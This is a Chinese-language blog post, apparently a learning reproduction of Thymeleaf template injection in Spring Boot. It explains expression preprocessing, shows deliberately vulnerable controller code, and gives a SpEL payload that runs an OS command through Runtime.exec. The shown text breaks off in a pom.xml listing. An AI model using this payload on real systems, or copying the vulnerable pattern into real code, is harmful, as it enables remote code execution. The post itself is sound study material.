

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Mechoy">
  <meta name="keywords" content="">
  
    <meta name="description" content="Thymeleafæ¨¡æ¿æ³¨å…¥0x00 å‰è¨€çœ‹åˆ«äººçš„ï¼Œæƒ³å¤ç°å­¦ä¹ ä¸€ä¸‹ï¼ŒåŠªåŠ›æ··å£é¥­åƒï¼Œè¦å­¦çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸€ä¸ªä¸ªæ¥å§ ç¯å¢ƒæ˜¯ï¼šspringboot2.3.2.RELEASE + spring-boot-starter-thymeleafï¼ˆthymeleafçš„ç‰ˆæœ¬æ˜¯3.0.11ï¼‰ 0x01 Thymeleafç®€ä»‹Thymeleaf æ˜¯ä¸€ç§é€‚ç”¨äº Web å’Œç‹¬ç«‹ç¯å¢ƒçš„ç°ä»£æœåŠ¡å™¨ç«¯ Java æ¨¡æ¿å¼•æ“ï¼Œèƒ½å¤Ÿå¤„ç†">
<meta property="og:type" content="article">
<meta property="og:title" content="Thymeleafæ¨¡æ¿æ³¨å…¥">
<meta property="og:url" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Mechoy&#39;s Blog">
<meta property="og:description" content="Thymeleafæ¨¡æ¿æ³¨å…¥0x00 å‰è¨€çœ‹åˆ«äººçš„ï¼Œæƒ³å¤ç°å­¦ä¹ ä¸€ä¸‹ï¼ŒåŠªåŠ›æ··å£é¥­åƒï¼Œè¦å­¦çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸€ä¸ªä¸ªæ¥å§ ç¯å¢ƒæ˜¯ï¼šspringboot2.3.2.RELEASE + spring-boot-starter-thymeleafï¼ˆthymeleafçš„ç‰ˆæœ¬æ˜¯3.0.11ï¼‰ 0x01 Thymeleafç®€ä»‹Thymeleaf æ˜¯ä¸€ç§é€‚ç”¨äº Web å’Œç‹¬ç«‹ç¯å¢ƒçš„ç°ä»£æœåŠ¡å™¨ç«¯ Java æ¨¡æ¿å¼•æ“ï¼Œèƒ½å¤Ÿå¤„ç†">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A52.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A53.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A54.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A55.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A56.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A57.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A58.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A59.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A510.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A511.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A512.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A513.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A514.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A515.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A516.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A517.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A518.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A519.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A520.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A522.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A523.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A524.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A525.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A526.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A527.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A538.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A537.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A539.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A540.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A541.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A542.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A543.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A521.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A528.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A529.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A530.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A531.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A532.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A533.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A534.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A535.png">
<meta property="og:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A536.png">
<meta property="article:published_time" content="2022-11-26T14:22:22.000Z">
<meta property="article:modified_time" content="2023-02-19T12:34:54.790Z">
<meta property="article:author" content="Mechoy">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png">
  
  
  <title>Thymeleafæ¨¡æ¿æ³¨å…¥ - Mechoy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Mechoy&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Thymeleafæ¨¡æ¿æ³¨å…¥"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Mechoy
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-11-26 22:22" pubdate>
          2022å¹´11æœˆ26æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          21k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          106 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Thymeleafæ¨¡æ¿æ³¨å…¥</h1>
            
            <div class="markdown-body">
              
              <h2 id="Thymeleafæ¨¡æ¿æ³¨å…¥"><a href="#Thymeleafæ¨¡æ¿æ³¨å…¥" class="headerlink" title="Thymeleafæ¨¡æ¿æ³¨å…¥"></a>Thymeleafæ¨¡æ¿æ³¨å…¥</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>çœ‹åˆ«äººçš„ï¼Œæƒ³å¤ç°å­¦ä¹ ä¸€ä¸‹ï¼ŒåŠªåŠ›æ··å£é¥­åƒï¼Œè¦å­¦çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸€ä¸ªä¸ªæ¥å§</p>
<p>ç¯å¢ƒæ˜¯ï¼šspringboot2.3.2.RELEASE + spring-boot-starter-thymeleafï¼ˆthymeleafçš„ç‰ˆæœ¬æ˜¯3.0.11ï¼‰</p>
<h3 id="0x01-Thymeleafç®€ä»‹"><a href="#0x01-Thymeleafç®€ä»‹" class="headerlink" title="0x01 Thymeleafç®€ä»‹"></a>0x01 Thymeleafç®€ä»‹</h3><p>Thymeleaf æ˜¯ä¸€ç§é€‚ç”¨äº Web å’Œç‹¬ç«‹ç¯å¢ƒçš„ç°ä»£æœåŠ¡å™¨ç«¯ Java æ¨¡æ¿å¼•æ“ï¼Œèƒ½å¤Ÿå¤„ç† HTMLã€XMLã€JavaScriptã€CSS ç”šè‡³çº¯æ–‡æœ¬ã€‚</p>
<p>Thymeleaf çš„ä¸»è¦ç›®æ ‡æ˜¯æä¾›ä¸€ç§ä¼˜é›…ä¸”é«˜åº¦å¯ç»´æŠ¤çš„æ¨¡æ¿åˆ›å»ºæ–¹å¼ã€‚ä¸ºå®ç°è¿™ä¸€ç‚¹ï¼Œå®ƒå»ºç«‹åœ¨<em>è‡ªç„¶æ¨¡æ¿</em>çš„æ¦‚å¿µä¹‹ä¸Šï¼Œä»¥ä¸å½±å“æ¨¡æ¿ç”¨ä½œè®¾è®¡åŸå‹çš„æ–¹å¼å°†å…¶é€»è¾‘æ³¨å…¥æ¨¡æ¿æ–‡ä»¶ã€‚</p>
<h4 id="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"><a href="#æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"></a>æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•</h4><p>thymeleafä¸­æ”¯æŒå¤šç§è¡¨è¾¾å¼ï¼Œè¿™ä¹Ÿæ˜¯thymeleafåŠŸèƒ½å¼ºçš„é‡è¦åŸå› ä¹‹ä¸€</p>
<ul>
<li><code>#&#123;...&#125;</code>    æ¶ˆæ¯è¡¨è¾¾å¼</li>
<li><code>$&#123;...&#125;</code>    å˜é‡è¡¨è¾¾å¼ï¼ˆå®é™…ä¸Šæ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­åŒ…å«çš„å˜é‡æ˜ å°„ä¸Šæ‰§è¡Œçš„ OGNLï¼ˆå¯¹è±¡å›¾å¯¼èˆªè¯­è¨€ï¼‰è¡¨è¾¾å¼ï¼‰</li>
<li><code>*&#123;...&#125;</code>    é€‰æ‹©è¡¨è¾¾å¼ï¼ˆå’Œå˜é‡è¡¨è¾¾å¼ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºè®¡ç®—<strong>é€‰å®šå¯¹è±¡</strong>ä¸Šçš„è¡¨è¾¾å¼è€Œä¸æ˜¯æ•´ä¸ªä¸Šä¸‹æ–‡ã€‚ï¼‰</li>
<li><code>@&#123;...&#125;</code>    é“¾æ¥ç½‘å€</li>
<li><code>~&#123;...&#125;</code>    ç‰‡æ®µè¡¨è¾¾å¼ï¼ˆè¡¨ç¤ºæ ‡è®°ç‰‡æ®µå¹¶åœ¨æ¨¡æ¿ä¸­ç§»åŠ¨å®ƒä»¬çš„ç®€å•æ–¹æ³•ï¼‰</li>
</ul>
<p>é™¤äº†æ‰€æœ‰è¿™äº›ç”¨äºè¡¨è¾¾å¼å¤„ç†çš„åŠŸèƒ½ä¹‹å¤–ï¼ŒThymeleaf è¿˜å…·æœ‰<strong>é¢„å¤„ç†</strong>è¡¨è¾¾å¼çš„åŠŸèƒ½ã€‚</p>
<h4 id="Thymeleafçš„é¢„å¤„ç†"><a href="#Thymeleafçš„é¢„å¤„ç†" class="headerlink" title="Thymeleafçš„é¢„å¤„ç†"></a>Thymeleafçš„é¢„å¤„ç†</h4><p>é¢„å¤„ç†æ˜¯åœ¨æ­£å¸¸è¡¨è¾¾å¼ä¹‹å‰æ‰§è¡Œçš„è¡¨è¾¾å¼ï¼Œå®ƒå…è®¸ä¿®æ”¹æœ€ç»ˆå°†è¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚</p>
<p>é¢„å¤„ç†è¡¨è¾¾å¼ä¸æ™®é€šè¡¨è¾¾å¼å®Œå…¨ä¸€æ ·ï¼Œä½†å‡ºç°åœ¨åŒä¸‹åˆ’çº¿ç¬¦å·ï¼ˆå¦‚<code>__$&#123;expression&#125;__</code>ï¼‰çš„åŒ…å›´ä¸­ã€‚</p>
<p>ç”±äºæ˜¯ä½¿ç”¨çš„springboot+thymeleafè¿›è¡Œçš„å¤ç°ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„ä¹Ÿå°±æ˜¯springELè¡¨è¾¾å¼</p>
<h3 id="0x02-æ¼æ´æˆå› "><a href="#0x02-æ¼æ´æˆå› " class="headerlink" title="0x02 æ¼æ´æˆå› "></a>0x02 æ¼æ´æˆå› </h3><p>Thymeleafçš„æ”¯æŒè¡¨è¾¾å¼é¢„å¤„ç†ï¼Œå½“è¿›å…¥Thymeleafè§†å›¾è§£æå™¨çš„Viewä¸­åŒ…å«<code>__$&#123;expression&#125;__</code>è¿™ç§å½¢å¼çš„è¯­å¥æ—¶ï¼ŒThymeleafä¼šè®¤ä¸ºæ­¤å¤„éœ€è¦è¿›è¡Œ<strong>é¢„å¤„ç†</strong>ï¼Œå½“åœ¨<code>expression</code>å¤„ä¼ å…¥æ¶æ„ä»£ç æ—¶ï¼Œå°±å¯ä»¥å®ç°æ”»å‡»ï¼Œä½†æ­¤ç±»æ¼æ´çš„åˆ©ç”¨åœºæ™¯è¾ƒä¸ºå°‘è§ï¼ˆå¯èƒ½æ˜¯æˆ‘è§çš„å°‘ğŸ˜­ï¼‰ï¼Œå¸¸è§çš„æƒ…å†µä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="0x03-å¤ç°åˆ†æ"><a href="#0x03-å¤ç°åˆ†æ" class="headerlink" title="0x03 å¤ç°åˆ†æ"></a>0x03 å¤ç°åˆ†æ</h3><h4 id="åœºæ™¯1"><a href="#åœºæ™¯1" class="headerlink" title="åœºæ™¯1"></a>åœºæ™¯1</h4><p><strong>exp</strong>ï¼š<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__</code></p>
<p><strong>Thymeleafç‰ˆæœ¬ï¼š3.0.11</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2.RELEASE<span 